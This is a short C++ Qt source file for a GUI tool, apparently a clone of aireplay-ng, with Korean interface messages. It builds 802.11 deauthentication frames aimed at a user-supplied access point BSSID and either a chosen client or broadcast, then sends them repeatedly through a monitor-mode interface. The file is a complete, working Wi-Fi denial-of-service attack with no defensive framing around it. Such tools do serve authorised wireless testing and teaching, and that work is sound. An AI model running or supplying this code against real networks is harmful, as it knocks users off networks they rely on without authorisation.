#include "mywindow.h"
#include "ui_mywindow.h"

#include <tins/tins.h>

using namespace Tins;

MyWindow::MyWindow(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::MyWindow)
{
    ui->setupUi(this);
    this->setWindowTitle("Aireplay - LHS");
}

MyWindow::~MyWindow()
{
    delete ui;
}

void MyWindow::on_start_clicked()
{
    if(ui->bssid->text() == NULL){
        QMessageBox* a = new QMessageBox();
        a->setWindowTitle("Warning!");
        a->setText(QString("BSSID가 입력되지 않았습니다."));
        a->exec();
        return;
    }
    Dot11Deauthentication deauth;
    if(ui->staddr->text() != NULL) deauth.addr1(ui->staddr->text().toStdString());
    else deauth.addr1(Dot11::BROADCAST);
    deauth.addr2(ui->bssid->text().toStdString());
    deauth.addr3(deauth.addr2());

    RadioTap radio;
    PacketSender sender;
    NetworkInterface iface("mon0");

    radio = RadioTap() / deauth;
    int repeat = 50;
    if(ui->rep->text() != NULL) repeat = ui->rep->text().toInt();
    for(int i=0;i<repeat;i++)
        sender.send(radio, iface);

    QMessageBox* fin = new QMessageBox();
    fin->setWindowTitle("Info");
    fin->setText(QString("deauth 패킷이 전송되었습니다."));
    fin->exec();
    return;
}
